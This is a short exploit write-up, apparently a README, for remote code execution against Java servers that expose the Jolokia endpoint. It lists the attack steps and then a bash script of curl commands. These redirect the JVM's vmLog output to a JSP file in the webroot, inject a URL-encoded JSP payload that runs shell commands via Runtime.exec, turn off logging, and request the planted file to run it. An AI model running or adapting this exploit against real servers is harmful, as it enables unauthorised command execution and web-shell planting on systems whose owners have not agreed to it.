# Short description

- Use DiagnosticCommand/vmLog to define the vm logfile to a writeable path in the webroot, controled extension
- Inject your JSP payload in the logfile by triggering an error
- Disable logs to avoid bloating the jsp file created
- Trigger RCE by querying the jsp file on the webroot


# Exploit

```bash
JSPFILE=jsp$RANDOM.jsp
curl -kg 'http://127.0.0.1/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/path!/to!/'"$JSPFILE"
sleep 1
curl -kg 'http://127.0.0.1/jolokia/win%253C%2525%2520Runtime.getRuntime%2528%2529.exec%2528new%2520String%255B%255D%2520%257B%2520%2522sh%2522%252C%2520%2522-c%2522%252C%2520%2522id%253E!/tmp!/id.out%2522%2520%257D%2529%253B%2520%2525%253Ewin'
sleep 1
curl -kg 'http://127.0.0.1/jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable'
sleep 1
curl -kg 'http://127.0.0.1/'"$JSPFILE"
```